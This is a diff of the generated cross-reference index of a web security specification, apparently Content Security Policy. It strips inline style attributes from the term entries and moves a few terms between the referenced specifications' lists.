+     <li><span class="dfn-paneled" id="term-for-concept-shadow-including-root">shadow-including root</span>
+     <li><span class="dfn-paneled" id="term-for-dom-event-target">target</span>
     </ul>
    <li>
     <a data-link-type="biblio">[ECMA262]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-sec-function-objects" style="color:initial">Function()</span>
-     <li><span class="dfn-paneled" id="term-for-sec-hostensurecancompilestrings" style="color:initial">HostEnsureCanCompileStrings()</span>
-     <li><span class="dfn-paneled" id="term-for-sec-json.stringify" style="color:initial">JSON.stringify()</span>
-     <li><span class="dfn-paneled" id="term-for-sec-eval-x" style="color:initial">eval()</span>
-     <li><span class="dfn-paneled" id="term-for-realm" style="color:initial">realm</span>
+     <li><span class="dfn-paneled" id="term-for-sec-function-objects">Function()</span>
+     <li><span class="dfn-paneled" id="term-for-sec-hostensurecancompilestrings">HostEnsureCanCompileStrings()</span>
+     <li><span class="dfn-paneled" id="term-for-sec-json.stringify">JSON.stringify()</span>
+     <li><span class="dfn-paneled" id="term-for-sec-eval-x">eval()</span>
+     <li><span class="dfn-paneled" id="term-for-realm">realm</span>
     </ul>
    <li>
     <a data-link-type="biblio">[ENCODING]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-utf-8-encode" style="color:initial">utf-8 encode</span>
+     <li><span class="dfn-paneled" id="term-for-utf-8-encode">utf-8 encode</span>
     </ul>
    <li>
     <a data-link-type="biblio">[FETCH]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-concept-request-body" style="color:initial">body</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-client" style="color:initial">client</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-credentials-mode" style="color:initial">credentials mode</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-nonce-metadata" style="color:initial">cryptographic nonce metadata</span>
-     <li><span class="dfn-paneled" id="term-for-concept-response-csp-list" style="color:initial">csp list</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-current-url" style="color:initial">current url</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-destination" style="color:initial">destination</span>
-     <li><span class="dfn-paneled" id="term-for-concept-header-extract-mime-type" style="color:initial">extract a mime type</span>
-     <li><span class="dfn-paneled" id="term-for-extract-header-list-values" style="color:initial">extracting header list values</span>
-     <li><span class="dfn-paneled" id="term-for-concept-fetch" style="color:initial">fetch</span>
-     <li><span class="dfn-paneled" id="term-for-concept-response-header-list" style="color:initial">header list <small>(for response)</small></span>
-     <li><span class="dfn-paneled" id="term-for-concept-http-fetch" style="color:initial">http fetch</span>
-     <li><span class="dfn-paneled" id="term-for-concept-http-network-fetch" style="color:initial">http-network fetch</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-initiator" style="color:initial">initiator</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-integrity-metadata" style="color:initial">integrity metadata</span>
-     <li><span class="dfn-paneled" id="term-for-request-keepalive-flag" style="color:initial">keepalive flag</span>
-     <li><span class="dfn-paneled" id="term-for-local-scheme" style="color:initial">local scheme</span>
-     <li><span class="dfn-paneled" id="term-for-concept-main-fetch" style="color:initial">main fetch</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-method" style="color:initial">method</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-mode" style="color:initial">mode</span>
-     <li><span class="dfn-paneled" id="term-for-concept-network-error" style="color:initial">network error</span>
-     <li><span class="dfn-paneled" id="term-for-network-scheme" style="color:initial">network scheme</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-origin" style="color:initial">origin</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-parser-metadata" style="color:initial">parser metadata</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-redirect-count" style="color:initial">redirect count</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-redirect-mode" style="color:initial">redirect mode</span>
-     <li><span class="dfn-paneled" id="term-for-redirect-status" style="color:initial">redirect status</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request" style="color:initial">request</span>
-     <li><span class="dfn-paneled" id="term-for-concept-response" style="color:initial">response</span>
-     <li><span class="dfn-paneled" id="term-for-request-destination-script-like" style="color:initial">script-like</span>
-     <li><span class="dfn-paneled" id="term-for-concept-response-status" style="color:initial">status</span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-target-browsing-context" style="color:initial">target browsing context</span>
-     <li><span class="dfn-paneled" id="term-for-concept-response-url" style="color:initial">url <small>(for response)</small></span>
-     <li><span class="dfn-paneled" id="term-for-concept-request-window" style="color:initial">window</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-body">body</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-client">client</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-credentials-mode">credentials mode</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-nonce-metadata">cryptographic nonce metadata</span>
+     <li><span class="dfn-paneled" id="term-for-concept-response-csp-list">csp list</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-current-url">current url</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-destination">destination</span>
+     <li><span class="dfn-paneled" id="term-for-concept-header-extract-mime-type">extract a mime type</span>
+     <li><span class="dfn-paneled" id="term-for-extract-header-list-values">extracting header list values</span>
+     <li><span class="dfn-paneled" id="term-for-concept-fetch">fetch</span>
+     <li><span class="dfn-paneled" id="term-for-concept-response-header-list">header list <small>(for response)</small></span>
+     <li><span class="dfn-paneled" id="term-for-concept-http-fetch">http fetch</span>
+     <li><span class="dfn-paneled" id="term-for-concept-http-network-fetch">http-network fetch</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-initiator">initiator</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-integrity-metadata">integrity metadata</span>
+     <li><span class="dfn-paneled" id="term-for-request-keepalive-flag">keepalive flag</span>
+     <li><span class="dfn-paneled" id="term-for-local-scheme">local scheme</span>
+     <li><span class="dfn-paneled" id="term-for-concept-main-fetch">main fetch</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-method">method</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-mode">mode</span>
+     <li><span class="dfn-paneled" id="term-for-concept-network-error">network error</span>
+     <li><span class="dfn-paneled" id="term-for-network-scheme">network scheme</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-origin">origin</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-parser-metadata">parser metadata</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-redirect-count">redirect count</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-redirect-mode">redirect mode</span>
+     <li><span class="dfn-paneled" id="term-for-redirect-status">redirect status</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request">request</span>
+     <li><span class="dfn-paneled" id="term-for-concept-response">response</span>
+     <li><span class="dfn-paneled" id="term-for-request-destination-script-like">script-like</span>
+     <li><span class="dfn-paneled" id="term-for-concept-response-status">status</span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-target-browsing-context">target browsing context</span>
+     <li><span class="dfn-paneled" id="term-for-concept-response-url">url <small>(for response)</small></span>
+     <li><span class="dfn-paneled" id="term-for-concept-request-window">window</span>
     </ul>
    <li>
     <a data-link-type="biblio">[HTML]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-parser-inserted" style="color:initial">"parser-inserted"</span>
-     <li><span class="dfn-paneled" id="term-for-dedicatedworkerglobalscope" style="color:initial">DedicatedWorkerGlobalScope</span>
-     <li><span class="dfn-paneled" id="term-for-sharedworker" style="color:initial">SharedWorker</span>
-     <li><span class="dfn-paneled" id="term-for-sharedworkerglobalscope" style="color:initial">SharedWorkerGlobalScope</span>
-     <li><span class="dfn-paneled" id="term-for-window" style="color:initial">Window</span>
-     <li><span class="dfn-paneled" id="term-for-worker" style="color:initial">Worker</span>
-     <li><span class="dfn-paneled" id="term-for-workerglobalscope" style="color:initial">WorkerGlobalScope</span>
-     <li><span class="dfn-paneled" id="term-for-the-a-element" style="color:initial">a</span>
-     <li><span class="dfn-paneled" id="term-for-an-iframe-srcdoc-document" style="color:initial">an iframe srcdoc document</span>
-     <li><span class="dfn-paneled" id="term-for-ascii-serialisation-of-an-origin" style="color:initial">ascii serialization of an origin</span>
-     <li><span class="dfn-paneled" id="term-for-concept-document-window" style="color:initial">associated document</span>
-     <li><span class="dfn-paneled" id="term-for-the-base-element" style="color:initial">base</span>
-     <li><span class="dfn-paneled" id="term-for-browsing-context" style="color:initial">browsing context</span>
-     <li><span class="dfn-paneled" id="term-for-attr-meta-content" style="color:initial">content</span>
-     <li><span class="dfn-paneled" id="term-for-attr-meta-http-equiv-content-security-policy" style="color:initial">content security policy state</span>
-     <li><span class="dfn-paneled" id="term-for-concept-document-csp-list" style="color:initial">csp list</span>
-     <li><span class="dfn-paneled" id="term-for-current-settings-object" style="color:initial">current settings object</span>
-     <li><span class="dfn-paneled" id="term-for-attr-object-data" style="color:initial">data</span>
-     <li><span class="dfn-paneled" id="term-for-dom-document-2" style="color:initial">document</span>
-     <li><span class="dfn-paneled" id="term-for-parse-error-duplicate-attribute" style="color:initial">duplicate-attribute</span>
-     <li><span class="dfn-paneled" id="term-for-the-embed-element" style="color:initial">embed</span>
-     <li><span class="dfn-paneled" id="term-for-environment-settings-object" style="color:initial">environment settings object</span>
-     <li><span class="dfn-paneled" id="term-for-forced-sandboxing-flag-set" style="color:initial">forced sandboxing flag set</span>
-     <li><span class="dfn-paneled" id="term-for-the-form-element" style="color:initial">form</span>
-     <li><span class="dfn-paneled" id="term-for-frame" style="color:initial">frame</span>
-     <li><span class="dfn-paneled" id="term-for-concept-settings-object-global" style="color:initial">global object <small>(for environment settings object)</small></span>
-     <li><span class="dfn-paneled" id="term-for-attr-base-href" style="color:initial">href</span>
-     <li><span class="dfn-paneled" id="term-for-attr-meta-http-equiv" style="color:initial">http-equiv</span>
-     <li><span class="dfn-paneled" id="term-for-the-iframe-element" style="color:initial">iframe</span>
-     <li><span class="dfn-paneled" id="term-for-the-link-element" style="color:initial">link</span>
-     <li><span class="dfn-paneled" id="term-for-meta" style="color:initial">meta</span>
-     <li><span class="dfn-paneled" id="term-for-nested-browsing-context" style="color:initial">nested browsing context</span>
-     <li><span class="dfn-paneled" id="term-for-attr-nonce" style="color:initial">nonce</span>
-     <li><span class="dfn-paneled" id="term-for-the-object-element" style="color:initial">object</span>
-     <li><span class="dfn-paneled" id="term-for-concept-origin-opaque" style="color:initial">opaque origin</span>
-     <li><span class="dfn-paneled" id="term-for-concept-settings-object-origin" style="color:initial">origin <small>(for environment settings object)</small></span>
-     <li><span class="dfn-paneled" id="term-for-concept-WorkerGlobalScope-owner-set" style="color:initial">owner set</span>
-     <li><span class="dfn-paneled" id="term-for-parse-a-sandboxing-directive" style="color:initial">parse a sandboxing directive</span>
-     <li><span class="dfn-paneled" id="term-for-parse-errors" style="color:initial">parse errors</span>
-     <li><span class="dfn-paneled" id="term-for-dom-a-ping" style="color:initial">ping</span>
-     <li><span class="dfn-paneled" id="term-for-plugin-document" style="color:initial">plugin document</span>
-     <li><span class="dfn-paneled" id="term-for-prepare-a-script" style="color:initial">prepare a script</span>
-     <li><span class="dfn-paneled" id="term-for-process-a-navigate-fetch" style="color:initial">process a navigate fetch</span>
-     <li><span class="dfn-paneled" id="term-for-process-a-navigate-response" style="color:initial">process a navigate response</span>
-     <li><span class="dfn-paneled" id="term-for-process-the-iframe-attributes" style="color:initial">process the iframe attributes</span>
-     <li><span class="dfn-paneled" id="term-for-queue-a-task" style="color:initial">queue a task</span>
-     <li><span class="dfn-paneled" id="term-for-dom-document-referrer" style="color:initial">referrer</span>
-     <li><span class="dfn-paneled" id="term-for-relevant-settings-object" style="color:initial">relevant settings object</span>
-     <li><span class="dfn-paneled" id="term-for-run-a-worker" style="color:initial">run a worker</span>
-     <li><span class="dfn-paneled" id="term-for-attr-iframe-sandbox" style="color:initial">sandbox</span>
-     <li><span class="dfn-paneled" id="term-for-sandboxed-origin-browsing-context-flag" style="color:initial">sandboxed origin browsing context flag</span>
-     <li><span class="dfn-paneled" id="term-for-sandboxed-scripts-browsing-context-flag" style="color:initial">sandboxed scripts browsing context flag</span>
-     <li><span class="dfn-paneled" id="term-for-concept-origin-scheme" style="color:initial">scheme</span>
-     <li><span class="dfn-paneled" id="term-for-script" style="color:initial">script</span>
-     <li><span class="dfn-paneled" id="term-for-set-the-frozen-base-url" style="color:initial">set the frozen base url</span>
-     <li><span class="dfn-paneled" id="term-for-dom-setinterval" style="color:initial">setInterval()</span>
-     <li><span class="dfn-paneled" id="term-for-dom-settimeout" style="color:initial">setTimeout()</span>
-     <li><span class="dfn-paneled" id="term-for-source-browsing-context" style="color:initial">source browsing context</span>
-     <li><span class="dfn-paneled" id="term-for-the-style-element" style="color:initial">style</span>
-     <li><span class="dfn-paneled" id="term-for-top-level-browsing-context" style="color:initial">top-level browsing context</span>
-     <li><span class="dfn-paneled" id="term-for-attr-embed-type" style="color:initial">type</span>
-     <li><span class="dfn-paneled" id="term-for-update-a-style-block" style="color:initial">update a style block</span>
+     <li><span class="dfn-paneled" id="term-for-dedicatedworkerglobalscope">DedicatedWorkerGlobalScope</span>
+     <li><span class="dfn-paneled" id="term-for-sharedworker">SharedWorker</span>
+     <li><span class="dfn-paneled" id="term-for-sharedworkerglobalscope">SharedWorkerGlobalScope</span>
+     <li><span class="dfn-paneled" id="term-for-window">Window</span>
+     <li><span class="dfn-paneled" id="term-for-worker">Worker</span>
+     <li><span class="dfn-paneled" id="term-for-workerglobalscope">WorkerGlobalScope</span>
+     <li><span class="dfn-paneled" id="term-for-workletglobalscope">WorkletGlobalScope</span>
+     <li><span class="dfn-paneled" id="term-for-the-a-element">a</span>
+     <li><span class="dfn-paneled" id="term-for-an-iframe-srcdoc-document">an iframe srcdoc document</span>
+     <li><span class="dfn-paneled" id="term-for-ascii-serialisation-of-an-origin">ascii serialization of an origin</span>
+     <li><span class="dfn-paneled" id="term-for-concept-document-window">associated document</span>
+     <li><span class="dfn-paneled" id="term-for-the-base-element">base</span>
+     <li><span class="dfn-paneled" id="term-for-browsing-context">browsing context</span>
+     <li><span class="dfn-paneled" id="term-for-attr-meta-content">content</span>
+     <li><span class="dfn-paneled" id="term-for-concept-document-csp-list">csp list</span>
+     <li><span class="dfn-paneled" id="term-for-current-settings-object">current settings object</span>
+     <li><span class="dfn-paneled" id="term-for-attr-object-data">data</span>
+     <li><span class="dfn-paneled" id="term-for-dom-document-2">document</span>
+     <li><span class="dfn-paneled" id="term-for-parse-error-duplicate-attribute">duplicate-attribute</span>
+     <li><span class="dfn-paneled" id="term-for-the-embed-element">embed</span>
+     <li><span class="dfn-paneled" id="term-for-environment-settings-object">environment settings object</span>
+     <li><span class="dfn-paneled" id="term-for-forced-sandboxing-flag-set">forced sandboxing flag set</span>
+     <li><span class="dfn-paneled" id="term-for-the-form-element">form</span>
+     <li><span class="dfn-paneled" id="term-for-frame">frame</span>
+     <li><span class="dfn-paneled" id="term-for-concept-settings-object-global">global object <small>(for environment settings object)</small></span>
+     <li><span class="dfn-paneled" id="term-for-attr-base-href">href</span>
+     <li><span class="dfn-paneled" id="term-for-attr-meta-http-equiv">http-equiv</span>
+     <li><span class="dfn-paneled" id="term-for-the-iframe-element">iframe</span>
+     <li><span class="dfn-paneled" id="term-for-the-link-element">link</span>
+     <li><span class="dfn-paneled" id="term-for-meta">meta</span>
+     <li><span class="dfn-paneled" id="term-for-nested-browsing-context">nested browsing context</span>
+     <li><span class="dfn-paneled" id="term-for-attr-nonce">nonce</span>
+     <li><span class="dfn-paneled" id="term-for-the-object-element">object</span>
+     <li><span class="dfn-paneled" id="term-for-concept-origin-opaque">opaque origin</span>
+     <li><span class="dfn-paneled" id="term-for-concept-settings-object-origin">origin <small>(for environment settings object)</small></span>
+     <li><span class="dfn-paneled" id="term-for-concept-WorkerGlobalScope-owner-set">owner set</span>
+     <li><span class="dfn-paneled" id="term-for-parse-a-sandboxing-directive">parse a sandboxing directive</span>
+     <li><span class="dfn-paneled" id="term-for-parse-errors">parse errors</span>
+     <li><span class="dfn-paneled" id="term-for-dom-a-ping">ping</span>
+     <li><span class="dfn-paneled" id="term-for-plugin-document">plugin document</span>
+     <li><span class="dfn-paneled" id="term-for-prepare-a-script">prepare a script</span>
+     <li><span class="dfn-paneled" id="term-for-process-a-navigate-fetch">process a navigate fetch</span>
+     <li><span class="dfn-paneled" id="term-for-process-a-navigate-response">process a navigate response</span>
+     <li><span class="dfn-paneled" id="term-for-process-the-iframe-attributes">process the iframe attributes</span>
+     <li><span class="dfn-paneled" id="term-for-queue-a-task">queue a task</span>
+     <li><span class="dfn-paneled" id="term-for-dom-document-referrer">referrer</span>
+     <li><span class="dfn-paneled" id="term-for-relevant-settings-object">relevant settings object</span>
+     <li><span class="dfn-paneled" id="term-for-run-a-worker">run a worker</span>
+     <li><span class="dfn-paneled" id="term-for-attr-iframe-sandbox">sandbox</span>
+     <li><span class="dfn-paneled" id="term-for-sandboxed-origin-browsing-context-flag">sandboxed origin browsing context flag</span>
+     <li><span class="dfn-paneled" id="term-for-sandboxed-scripts-browsing-context-flag">sandboxed scripts browsing context flag</span>
+     <li><span class="dfn-paneled" id="term-for-concept-origin-scheme">scheme</span>
+     <li><span class="dfn-paneled" id="term-for-script">script</span>
+     <li><span class="dfn-paneled" id="term-for-set-the-frozen-base-url">set the frozen base url</span>
+     <li><span class="dfn-paneled" id="term-for-dom-setinterval">setInterval()</span>
+     <li><span class="dfn-paneled" id="term-for-dom-settimeout">setTimeout()</span>
+     <li><span class="dfn-paneled" id="term-for-source-browsing-context">source browsing context</span>
+     <li><span class="dfn-paneled" id="term-for-the-style-element">style</span>
+     <li><span class="dfn-paneled" id="term-for-top-level-browsing-context">top-level browsing context</span>
+     <li><span class="dfn-paneled" id="term-for-attr-embed-type">type</span>
+     <li><span class="dfn-paneled" id="term-for-update-a-style-block">update a style block</span>
     </ul>
    <li>
     <a data-link-type="biblio">[INFRA]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-set-append" style="color:initial">append <small>(for set)</small></span>
-     <li><span class="dfn-paneled" id="term-for-ascii-case-insensitive" style="color:initial">ascii case-insensitive</span>
-     <li><span class="dfn-paneled" id="term-for-ascii-lowercase" style="color:initial">ascii lowercase</span>
-     <li><span class="dfn-paneled" id="term-for-ascii-string" style="color:initial">ascii string</span>
-     <li><span class="dfn-paneled" id="term-for-ascii-whitespace" style="color:initial">ascii whitespace</span>
-     <li><span class="dfn-paneled" id="term-for-collect-a-sequence-of-code-points" style="color:initial">collecting a sequence of code points</span>
-     <li><span class="dfn-paneled" id="term-for-list-contain" style="color:initial">contain</span>
-     <li><span class="dfn-paneled" id="term-for-iteration-continue" style="color:initial">continue</span>
-     <li><span class="dfn-paneled" id="term-for-javascript-string-convert" style="color:initial">convert</span>
-     <li><span class="dfn-paneled" id="term-for-" style="color:initial">infra</span>
-     <li><span class="dfn-paneled" id="term-for-list-is-empty" style="color:initial">is empty</span>
-     <li><span class="dfn-paneled" id="term-for-list" style="color:initial">list</span>
-     <li><span class="dfn-paneled" id="term-for-ordered-set" style="color:initial">ordered set</span>
-     <li><span class="dfn-paneled" id="term-for-ordered-set①" style="color:initial">set</span>
-     <li><span class="dfn-paneled" id="term-for-split-on-ascii-whitespace" style="color:initial">split a string on ascii whitespace</span>
-     <li><span class="dfn-paneled" id="term-for-split-on-commas" style="color:initial">split a string on commas</span>
-     <li><span class="dfn-paneled" id="term-for-strictly-split" style="color:initial">strictly split a string</span>
-     <li><span class="dfn-paneled" id="term-for-string" style="color:initial">string</span>
-     <li><span class="dfn-paneled" id="term-for-strip-leading-and-trailing-ascii-whitespace" style="color:initial">strip leading and trailing ascii whitespace</span>
+     <li><span class="dfn-paneled" id="term-for-set-append">append <small>(for set)</small></span>
+     <li><span class="dfn-paneled" id="term-for-ascii-case-insensitive">ascii case-insensitive</span>
+     <li><span class="dfn-paneled" id="term-for-ascii-lowercase">ascii lowercase</span>
+     <li><span class="dfn-paneled" id="term-for-ascii-string">ascii string</span>
+     <li><span class="dfn-paneled" id="term-for-ascii-whitespace">ascii whitespace</span>
+     <li><span class="dfn-paneled" id="term-for-collect-a-sequence-of-code-points">collecting a sequence of code points</span>
+     <li><span class="dfn-paneled" id="term-for-list-contain">contain</span>
+     <li><span class="dfn-paneled" id="term-for-iteration-continue">continue</span>
+     <li><span class="dfn-paneled" id="term-for-javascript-string-convert">convert</span>
+     <li><span class="dfn-paneled" id="term-for-">infra</span>
+     <li><span class="dfn-paneled" id="term-for-list-is-empty">is empty</span>
+     <li><span class="dfn-paneled" id="term-for-list">list</span>
+     <li><span class="dfn-paneled" id="term-for-ordered-set">ordered set</span>
+     <li><span class="dfn-paneled" id="term-for-ordered-set①">set</span>
+     <li><span class="dfn-paneled" id="term-for-split-on-ascii-whitespace">split a string on ascii whitespace</span>
+     <li><span class="dfn-paneled" id="term-for-split-on-commas">split a string on commas</span>
+     <li><span class="dfn-paneled" id="term-for-strictly-split">strictly split a string</span>
+     <li><span class="dfn-paneled" id="term-for-string">string</span>
+     <li><span class="dfn-paneled" id="term-for-strip-leading-and-trailing-ascii-whitespace">strip leading and trailing ascii whitespace</span>
     </ul>
    <li>
     <a data-link-type="biblio">[MIMESNIFF]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-valid-mime-type" style="color:initial">valid mime type</span>
+     <li><span class="dfn-paneled" id="term-for-valid-mime-type">valid mime type</span>
     </ul>
    <li>
     <a data-link-type="biblio">[REPORTING]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-group" style="color:initial">group</span>
-     <li><span class="dfn-paneled" id="term-for-queue-report" style="color:initial">queue report</span>
-     <li><span class="dfn-paneled" id="term-for-report-type" style="color:initial">report type</span>
-     <li><span class="dfn-paneled" id="term-for-visible-to-reportingobservers" style="color:initial">visible to reportingobservers</span>
+     <li><span class="dfn-paneled" id="term-for-group">group</span>
+     <li><span class="dfn-paneled" id="term-for-queue-report">queue report</span>
+     <li><span class="dfn-paneled" id="term-for-report-type">report type</span>
+     <li><span class="dfn-paneled" id="term-for-visible-to-reportingobservers">visible to reportingobservers</span>
     </ul>
    <li>
     <a data-link-type="biblio">[reporting-1]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-reportbody" style="color:initial">ReportBody</span>
+     <li><span class="dfn-paneled" id="term-for-reportbody">ReportBody</span>
     </ul>
    <li>
     <a data-link-type="biblio">[rfc2045]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-section-5.1" style="color:initial">subtype</span>
-     <li><span class="dfn-paneled" id="term-for-section-5.1①" style="color:initial">type</span>
+     <li><span class="dfn-paneled" id="term-for-section-5.1">subtype</span>
+     <li><span class="dfn-paneled" id="term-for-section-5.1①">type</span>
     </ul>
    <li>
     <a data-link-type="biblio">[RFC3986]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-section-3.2.2" style="color:initial">ipv4address</span>
-     <li><span class="dfn-paneled" id="term-for-section-3.3" style="color:initial">path-absolute</span>
-     <li><span class="dfn-paneled" id="term-for-section-3.1" style="color:initial">scheme</span>
-     <li><span class="dfn-paneled" id="term-for-section-4.1" style="color:initial">uri-reference</span>
+     <li><span class="dfn-paneled" id="term-for-section-3.2.2">ipv4address</span>
+     <li><span class="dfn-paneled" id="term-for-section-3.3">path-absolute</span>
+     <li><span class="dfn-paneled" id="term-for-section-3.1">scheme</span>
+     <li><span class="dfn-paneled" id="term-for-section-4.1">uri-reference</span>
     </ul>
    <li>
     <a data-link-type="biblio">[rfc4648]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-section-4" style="color:initial">base64 encoding</span>
-     <li><span class="dfn-paneled" id="term-for-section-5" style="color:initial">base64url encoding</span>
+     <li><span class="dfn-paneled" id="term-for-section-4">base64 encoding</span>
+     <li><span class="dfn-paneled" id="term-for-section-5">base64url encoding</span>
     </ul>
    <li>
     <a data-link-type="biblio">[RFC5234]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-appendix-B.1" style="color:initial">alpha</span>
-     <li><span class="dfn-paneled" id="term-for-appendix-B.1①" style="color:initial">digit</span>
-     <li><span class="dfn-paneled" id="term-for-appendix-B.1②" style="color:initial">vchar</span>
+     <li><span class="dfn-paneled" id="term-for-appendix-B.1">alpha</span>
+     <li><span class="dfn-paneled" id="term-for-appendix-B.1①">digit</span>
+     <li><span class="dfn-paneled" id="term-for-appendix-B.1②">vchar</span>
     </ul>
    <li>
     <a data-link-type="biblio">[RFC7230]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-section-3.2.3" style="color:initial">ows</span>
-     <li><span class="dfn-paneled" id="term-for-section-3.2.6" style="color:initial">token</span>
+     <li><span class="dfn-paneled" id="term-for-section-3.2.3">ows</span>
+     <li><span class="dfn-paneled" id="term-for-section-3.2.6">token</span>
     </ul>
    <li>
     <a data-link-type="biblio">[rfc7231]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-section-3" style="color:initial">representation</span>
-     <li><span class="dfn-paneled" id="term-for-section-3①" style="color:initial">resource representation</span>
+     <li><span class="dfn-paneled" id="term-for-section-3">representation</span>
+     <li><span class="dfn-paneled" id="term-for-section-3①">resource representation</span>
     </ul>
    <li>
     <a data-link-type="biblio">[service-workers-1]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-serviceworker" style="color:initial">ServiceWorker</span>
-     <li><span class="dfn-paneled" id="term-for-serviceworkerglobalscope" style="color:initial">ServiceWorkerGlobalScope</span>
+     <li><span class="dfn-paneled" id="term-for-serviceworker">ServiceWorker</span>
+     <li><span class="dfn-paneled" id="term-for-serviceworkerglobalscope">ServiceWorkerGlobalScope</span>
     </ul>
    <li>
     <a data-link-type="biblio">[sha2]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-①" style="color:initial">sha-256</span>
-     <li><span class="dfn-paneled" id="term-for-②" style="color:initial">sha-384</span>
-     <li><span class="dfn-paneled" id="term-for-③" style="color:initial">sha-512</span>
+     <li><span class="dfn-paneled" id="term-for-①">sha-256</span>
+     <li><span class="dfn-paneled" id="term-for-②">sha-384</span>
+     <li><span class="dfn-paneled" id="term-for-③">sha-512</span>
     </ul>
    <li>
     <a data-link-type="biblio">[URL]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-url" style="color:initial">URL</span>
-     <li><span class="dfn-paneled" id="term-for-concept-base-url" style="color:initial">base url</span>
-     <li><span class="dfn-paneled" id="term-for-default-port" style="color:initial">default port</span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-host" style="color:initial">host <small>(for url)</small></span>
-     <li><span class="dfn-paneled" id="term-for-concept-ipv6" style="color:initial">ipv6 address</span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-origin" style="color:initial">origin</span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-path" style="color:initial">path</span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-port" style="color:initial">port <small>(for url)</small></span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-scheme" style="color:initial">scheme</span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-parser" style="color:initial">url parser</span>
-     <li><span class="dfn-paneled" id="term-for-concept-url-serializer" style="color:initial">url serializer</span>
+     <li><span class="dfn-paneled" id="term-for-url">URL</span>
+     <li><span class="dfn-paneled" id="term-for-concept-base-url">base url</span>
+     <li><span class="dfn-paneled" id="term-for-default-port">default port</span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-host">host <small>(for url)</small></span>
+     <li><span class="dfn-paneled" id="term-for-concept-ipv6">ipv6 address</span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-origin">origin</span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-path">path</span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-port">port <small>(for url)</small></span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-scheme">scheme</span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-parser">url parser</span>
+     <li><span class="dfn-paneled" id="term-for-concept-url-serializer">url serializer</span>
     </ul>
    <li>
     <a data-link-type="biblio">[WebIDL]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-idl-DOMString" style="color:initial">DOMString</span>
-     <li><span class="dfn-paneled" id="term-for-Exposed" style="color:initial">Exposed</span>
-     <li><span class="dfn-paneled" id="term-for-idl-USVString" style="color:initial">USVString</span>
-     <li><span class="dfn-paneled" id="term-for-idl-unsigned-long" style="color:initial">unsigned long</span>
-     <li><span class="dfn-paneled" id="term-for-idl-unsigned-short" style="color:initial">unsigned short</span>
+     <li><span class="dfn-paneled" id="term-for-idl-DOMString">DOMString</span>
+     <li><span class="dfn-paneled" id="term-for-Exposed">Exposed</span>
+     <li><span class="dfn-paneled" id="term-for-idl-USVString">USVString</span>
+     <li><span class="dfn-paneled" id="term-for-idl-unsigned-long">unsigned long</span>
+     <li><span class="dfn-paneled" id="term-for-idl-unsigned-short">unsigned short</span>
     </ul>
    <li>
     <a data-link-type="biblio">[worklets-1]</a> defines the following terms:
     <ul>
-     <li><span class="dfn-paneled" id="term-for-workletglobalscope" style="color:initial">WorkletGlobalScope</span>
-     <li><span class="dfn-paneled" id="term-for-workletglobalscope-owner-document" style="color:initial">owner document</span>
+     <li><span class="dfn-paneled" id="term-for-workletglobalscope-owner-document">owner document</span>
     </ul>
   </ul>
   <h2 class="no-num no-ref heading settled" id="references"><span class="content">References</span><a class="self-link" href="#references"></a></h2>
